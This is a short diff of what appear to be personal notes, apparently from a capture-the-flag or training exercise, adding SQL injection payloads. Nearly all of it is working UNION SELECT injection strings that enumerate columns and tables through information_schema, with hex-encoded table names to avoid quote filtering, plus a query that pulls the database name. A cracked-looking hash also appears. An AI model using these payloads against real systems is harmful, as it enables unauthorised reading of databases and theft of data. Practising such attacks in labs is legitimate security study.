@@ -52,3 +52,10 @@ list all cloumns 1 UNION SELECT column_name, null FROM information_schema.column
 fortytwo ->  10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
 
+USER_PRIVILEGES 0x555345525f50524956494c45474553
+ 1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x555345525f50524956494c45474553--
+1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 0x4752414e544545--
+
+
+## db name
+1 UNION SELECT database(), null--
